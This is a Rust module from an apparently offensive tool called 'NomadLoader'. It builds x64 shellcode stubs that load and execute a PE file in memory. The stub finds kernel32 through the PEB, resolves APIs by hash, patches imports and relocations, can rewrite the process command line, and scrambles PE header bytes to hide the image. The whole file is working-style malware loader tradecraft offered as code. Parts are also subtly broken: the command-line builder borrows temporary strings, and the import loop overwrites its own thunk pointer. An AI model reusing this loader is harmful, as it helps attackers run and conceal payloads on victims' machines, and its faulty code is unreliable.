//! Assembly code templates and generation for shellcode
//!
//! This module provides functionality for generating x64 assembly code
//! for the shellcode stub.

use crate::generator::{GeneratorError, Result};
use keystone_engine::{Keystone, Arch, Mode, OptionType, OptionValue};
use std::collections::HashMap;
use log::{debug, info};

/// Assembly template system that allows variable substitution
#[derive(Debug)]
pub struct AssemblyTemplate {
    /// Base assembly code template with placeholders
    base_code: String,
    
    /// Variable values to substitute
    variables: HashMap<String, String>,
}

impl AssemblyTemplate {
    /// Create a new assembly template from base code
    pub fn new(base_code: &str) -> Self {
        Self {
            base_code: base_code.to_string(),
            variables: HashMap::new(),
        }
    }
    
    /// Set a variable value
    pub fn set(&mut self, var: &str, value: &str) -> &mut Self {
        self.variables.insert(var.to_string(), value.to_string());
        self
    }
    
    /// Set multiple variables at once
    pub fn set_many(&mut self, vars: &HashMap<String, String>) -> &mut Self {
        for (var, value) in vars {
            self.variables.insert(var.clone(), value.clone());
        }
        self
    }
    
    /// Render the template with all variables substituted
    pub fn render(&self) -> String {
        let mut result = self.base_code.clone();
        for (var, value) in &self.variables {
            let placeholder = format!("${{{}}}", var);
            result = result.replace(&placeholder, value);
        }
        result
    }
    
    /// Compile the rendered assembly to machine code
    pub fn compile(&self) -> Result<Vec<u8>> {
        let rendered = self.render();
        debug!("Compiling assembly code:\n{}", rendered);
        
        // Initialize Keystone engine
        let engine = Keystone::new(Arch::X86, Mode::MODE_64)
            .map_err(|e| GeneratorError::Assembly(format!("Failed to initialize Keystone engine: {}", e)))?;
        
        // Set options for more efficient encoding
        engine.option(OptionType::SYNTAX, OptionValue::SYNTAX_INTEL)
            .map_err(|e| GeneratorError::Assembly(format!("Failed to set syntax option: {}", e)))?;
        
        // Assemble the code
        let (bytes, _) = engine.asm(rendered.as_str(), 0)
            .map_err(|e| GeneratorError::Assembly(format!("Failed to assemble code: {}", e)))?;
        
        Ok(bytes)
    }
}

/// Generate assembly code for creating a command line
pub fn generate_cmdline_asm(cmdline: &str) -> String {
    // If no command line is provided, return empty code
    if cmdline.is_empty() {
        return String::new();
    }
    
    let mut instructions = vec![
        "mov rsi, [rax + 0x20];                # RSI = Address of ProcessParameters",
        "add rsi, 0x70;                        # RSI points to CommandLine member",
    ];
    
    // Calculate the length of the command line in UTF-16
    let cmdline_utf16: Vec<u16> = cmdline.encode_utf16().collect();
    let cmdline_length = cmdline_utf16.len() * 2 + 2; // Add 2 for the null terminator
    
    // Set the length of the command line
    instructions.push(&format!(
        "mov byte ptr [rsi], 0x{:02x};         # Set Length to {} bytes",
        cmdline_length, cmdline_length
    ));
    instructions.push(
        "mov byte ptr [rsi+2], 0xff;           # Set the max length of cmdline to 0xff bytes"
    );
    instructions.push(
        "mov rsi, [rsi+8];                     # RSI points to the string"
    );
    
    // Write the command line as UTF-16 characters
    for (i, c) in cmdline.encode_utf16().enumerate() {
        let offset = i * 2;
        instructions.push(&format!(
            "mov word ptr [rsi+0x{:x}], 0x{:04x};  # '{}'",
            offset, c, 
            if c > 0x20 && c < 0x7F {
                char::from_u32(c as u32).unwrap_or('?')
            } else {
                '?'
            }
        ));
    }
    
    // Add null terminator
    instructions.push(&format!(
        "mov word ptr [rsi+0x{:x}], 0x0000;    # Add null terminator",
        cmdline_utf16.len() * 2
    ));
    
    instructions.join("\n")
}

/// Get the base assembly code template for the shellcode stub
pub fn get_shellcode_stub_template() -> String {
    r#"
# NomadLoader Shellcode Stub Template
# This shellcode loads and executes a PE file in memory

start:
    # Align stack to 16 bytes
    and rsp, 0xFFFFFFFFFFFFFFF0

    # Find PEB and get command line
    xor rdx, rdx
    mov rax, gs:[rdx+0x60]                 # RAX = PEB

# Update command line if requested
${CMDLINE_ASM}

# Find kernel32.dll
find_kernel32:
    mov rsi, [rax+0x18]                    # RSI = Address of _PEB_LDR_DATA
    mov rsi, [rsi+0x30]                    # RSI = Address of InInitializationOrderModuleList
    mov r9, [rsi]                          # First entry
    mov r9, [r9]                           # Second entry
    mov r9, [r9+0x10]                      # R9 = Base address of kernel32.dll
    
# Parse kernel32.dll to find LoadLibraryA and GetProcAddress
parse_kernel32:
    mov rcx, r9                            # RCX = Base address of kernel32.dll (for later)
    
    # Find LoadLibraryA
    mov r8d, 0xec0e4e8e                    # LoadLibraryA hash
    call find_function                      
    mov r12, rax                           # R12 = LoadLibraryA

    # Find GetProcAddress  
    mov r8d, 0x7c0dfcaa                    # GetProcAddress hash
    call find_function
    mov r13, rax                           # R13 = GetProcAddress

    # Continue to PE loading
    jmp fix_pe_imports
    
# Function to find a function by hash
find_function:
    # Parse module in r9 to find function by hash in r8d
    mov ecx, [r9+0x3c]                     # ECX = offset to PE signature
    xor r15, r15
    mov r15b, 0x88                         # Offset to Export Directory
    add r15, r9                            # Base address
    add r15, rcx                           # Add PE signature offset
    mov r15d, dword ptr [r15]              # R15 = RVA of export directory
    add r15, r9                            # R15 = VA of export directory
    mov ecx, [r15+0x18]                    # ECX = Number of functions
    mov r14d, [r15+0x20]                   # R14 = RVA of function names table
    add r14, r9                            # R14 = VA of function names table

search_function:
    jrcxz not_found                        # If RCX = 0, function not found
    dec ecx                                # Decrement counter
    xor rsi, rsi
    mov esi, [r14+rcx*4]                   # RSI = RVA of function name
    add rsi, r9                            # RSI = VA of function name

    # Calculate hash of function name
    xor rax, rax
    xor rdx, rdx
    cld                                     # Clear direction flag for lodsb

hash_loop:
    lodsb                                   # Load next character into AL
    test al, al                             # Check for null terminator
    jz compare_hash                         # If zero, end of string
    ror edx, 0x0d                           # Rotate EDX right by 13 bits
    add edx, eax                            # Add current character to hash
    jmp hash_loop                           # Process next character

compare_hash:
    cmp edx, r8d                            # Compare hash with desired hash
    jnz search_function                     # If not equal, check next function
    mov r10d, [r15+0x24]                    # R10 = RVA of ordinals table
    add r10, r9                             # R10 = VA of ordinals table
    movzx ecx, word ptr [r10+rcx*2]         # ECX = Ordinal value
    mov r11d, [r15+0x1c]                    # R11 = RVA of function addresses table
    add r11, r9                             # R11 = VA of function addresses table
    mov eax, [r11+rcx*4]                    # EAX = RVA of function
    add rax, r9                             # RAX = VA of function
    ret                                     # Return with function address in RAX

not_found:
    xor rax, rax                            # Return NULL
    ret

# Fix PE imports
fix_pe_imports:
    # RBX will hold the base address of our PE
    lea rbx, [rip+${SHELLCODE_SIZE}]        # Get address of appended PE
    
    # Find NT headers
    call find_nt_header                     # RAX now contains NT header address
    
    # Get import directory info
    mov esi, [rax+0x90]                     # ESI = Import directory RVA
    test esi, esi                           # Check if import directory exists
    jz imports_done                         
    add rsi, rbx                            # RSI = Import directory VA
    mov edi, [rax+0x94]                     # EDI = Import directory size
    add rdi, rsi                            # RDI = End of import directory

import_loop:
    cmp rsi, rdi                            # Check if we're at the end
    jae imports_done                       
    
    # Check if this is terminating descriptor
    cmp dword ptr [rsi], 0                  # Check if original first thunk is zero
    jz imports_done
    cmp dword ptr [rsi+12], 0               # Check if name RVA is zero
    jz imports_done
    
    # Load the DLL
    mov ecx, [rsi+12]                       # ECX = RVA of DLL name
    add rcx, rbx                            # RCX = VA of DLL name
    call r12                                # Call LoadLibraryA
    test rax, rax                           # Check if library loaded
    jz next_import
    
    # Process imports
    mov ecx, [rsi]                          # ECX = RVA of original first thunk (ILT)
    test ecx, ecx                           # If no ILT, use IAT instead
    jnz have_ilt
    mov ecx, [rsi+16]                       # ECX = RVA of first thunk (IAT)
have_ilt:
    add rcx, rbx                            # RCX = VA of thunk table
    mov r15, rax                            # R15 = DLL handle
    mov r14d, [rsi+16]                      # R14D = RVA of IAT
    add r14, rbx                            # R14 = VA of IAT

thunk_loop:
    mov rax, [rcx]                          # RAX = Thunk value
    test rax, rax                           # Check if this is the end of thunks
    jz next_import
    
    # Check if import by ordinal or name
    mov rdx, rax                            # RDX = Thunk value
    and rax, 0x8000000000000000             # Check high bit for import by ordinal
    jz import_by_name
    
    # Import by ordinal
    and rdx, 0xFFFF                         # Mask to get ordinal
    mov rcx, r15                            # RCX = DLL handle
    call r13                                # Call GetProcAddress
    jmp update_iat
    
import_by_name:
    # Import by name
    mov eax, edx                            # EAX = RVA of import name
    add rdx, rbx                            # RDX = VA of import name
    add rdx, 2                              # Skip hint, point to name
    mov rcx, r15                            # RCX = DLL handle
    call r13                                # Call GetProcAddress
    
update_iat:
    mov [r14], rax                          # Update IAT entry with function address
    add rcx, 8                              # Move to next thunk
    add r14, 8                              # Move to next IAT entry
    jmp thunk_loop

next_import:
    add rsi, 20                             # Move to next import descriptor
    jmp import_loop

imports_done:

# Add JIT IAT patching trampolines and code
${JIT_TRAMPOLINES}
${JIT_PATCHER}

# Fix base relocations
fix_relocations:
    # Get base relocation directory info
    call find_nt_header                     # RAX now contains NT header address
    mov esi, [rax+0xB0]                     # ESI = Base relocation directory RVA
    test esi, esi                           # Check if relocation directory exists
    jz relocations_done
    add rsi, rbx                            # RSI = Base relocation directory VA
    mov edi, [rax+0xB4]                     # EDI = Base relocation directory size
    add rdi, rsi                            # RDI = End of relocation directory
    
    # Calculate image base delta
    mov r15, rbx                            # R15 = Actual base address
    mov r14, [rax+0x30]                     # R14 = Preferred base address
    sub r15, r14                            # R15 = Delta (actual - preferred)
    test r15, r15                           # If delta is zero, no need to relocate
    jz relocations_done
    
    # Process relocation blocks
block_loop:
    cmp rsi, rdi                            # Check if we're at the end
    jae relocations_done
    
    mov r10d, [rsi]                         # R10D = Page RVA
    mov r11d, [rsi+4]                       # R11D = Block size
    cmp r11d, 8                             # Check if block size is valid
    jbe next_block
    
    # Process entries in this block
    lea r12, [rsi+8]                        # R12 = First entry
    lea r13, [rsi+r11-2]                    # R13 = Last entry
    
entry_loop:
    cmp r12, r13
    ja next_block
    
    movzx eax, word ptr [r12]               # AX = Relocation entry
    mov edx, eax                            # EDX = Relocation entry
    and eax, 0xF000                         # AX = Type (high 4 bits)
    shr eax, 12                             # AL = Type
    and edx, 0x0FFF                         # EDX = Offset within page (low 12 bits)
    
    cmp al, 0                               # Type 0 is padding, skip
    je skip_entry
    
    # Apply relocation
    add edx, r10d                           # EDX = RVA of item to fix
    add rdx, rbx                            # RDX = VA of item to fix
    
    cmp al, 10                              # Check if DIR64 (type 10)
    je rel_dir64
    cmp al, 3                               # Check if HIGHLOW (type 3)
    jne skip_entry
    
    # Apply 32-bit relocation
    add dword ptr [rdx], r15d               # Add delta to 32-bit address
    jmp skip_entry
    
rel_dir64:
    # Apply 64-bit relocation
    add qword ptr [rdx], r15                # Add delta to 64-bit address
    
skip_entry:
    add r12, 2                              # Move to next entry
    jmp entry_loop
    
next_block:
    add rsi, r11                            # Move to next block
    jmp block_loop

relocations_done:

# Find entry point and execute PE
execute_pe:
    call find_nt_header                     # RAX now contains NT header address
    mov r8d, [rax+0x28]                     # R8D = Entry point RVA
    
    # Apply PE header obfuscation if enabled
${OBFUSCATE_ASM}
    
    # Jump to entry point
    add r8, rbx                             # R8 = Entry point VA
    jmp r8                                  # Jump to entry point

# Helper function to find NT header
find_nt_header:
    mov eax, [rbx+0x3c]                     # EAX = e_lfanew
    add rax, rbx                            # RAX = NT header address
    ret
"#.to_string()
}

/// Get obfuscation assembly code
pub fn get_obfuscation_code(segments: &[(u32, u32)]) -> String {
    if segments.is_empty() {
        return String::new();
    }
    
    let mut code = String::new();
    code.push_str("    # Obfuscate PE header\n");
    
    for (offset, size) in segments {
        let random_value = rand::random::<u32>();
        
        if *size == 2 {
            code.push_str(&format!(
                "    mov word ptr [rbx+{}], 0x{:04x};\n", 
                offset, random_value & 0xFFFF
            ));
        } else if *size == 4 {
            code.push_str(&format!(
                "    mov dword ptr [rbx+{}], 0x{:08x};\n", 
                offset, random_value
            ));
        } else if *size == 8 {
            let random_value2 = rand::random::<u32>();
            code.push_str(&format!(
                "    mov dword ptr [rbx+{}], 0x{:08x};\n    mov dword ptr [rbx+{}], 0x{:08x};\n", 
                offset, random_value, offset + 4, random_value2
            ));
        }
    }
    
    code
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_assembly_template() {
        let mut template = AssemblyTemplate::new("mov rax, ${VALUE}\nmov rbx, ${OTHER}");
        template.set("VALUE", "0x1234").set("OTHER", "rax");
        
        let rendered = template.render();
        assert_eq!(rendered, "mov rax, 0x1234\nmov rbx, rax");
    }
    
    #[test]
    fn test_compile_assembly() {
        let template = AssemblyTemplate::new("mov rax, 0x1234\nret");
        
        let machine_code = template.compile().unwrap();
        
        // Expected machine code for "mov rax, 0x1234; ret"
        let expected = vec![0x48, 0xc7, 0xc0, 0x34, 0x12, 0x00, 0x00, 0xc3];
        assert_eq!(machine_code, expected);
    }
    
    #[test]
    fn test_cmdline_asm() {
        let asm = generate_cmdline_asm("test");
        
        // Should contain command line instructions
        assert!(asm.contains("mov rsi, [rax + 0x20]"));
        assert!(asm.contains("add rsi, 0x70"));
        assert!(asm.contains("mov rsi, [rsi+8]"));
        
        // Should set unicode characters
        assert!(asm.contains("0x0074")); // 't'
        assert!(asm.contains("0x0065")); // 'e'
        assert!(asm.contains("0x0073")); // 's'
        assert!(asm.contains("0x0074")); // 't'
        
        // Should add null terminator
        assert!(asm.contains("0x0000"));
    }
    
    #[test]
    fn test_obfuscation_code() {
        let segments = vec![(0x3c, 4), (0x80, 2), (0xA0, 8)];
        let code = get_obfuscation_code(&segments);
        
        // Should contain obfuscation instructions
        assert!(code.contains("mov dword ptr [rbx+60], 0x"));    // 0x3c = 60
        assert!(code.contains("mov word ptr [rbx+128], 0x"));   // 0x80 = 128
        assert!(code.contains("mov dword ptr [rbx+160], 0x"));  // 0xA0 = 160
        assert!(code.contains("mov dword ptr [rbx+164], 0x"));  // 0xA0+4 = 164
    }
}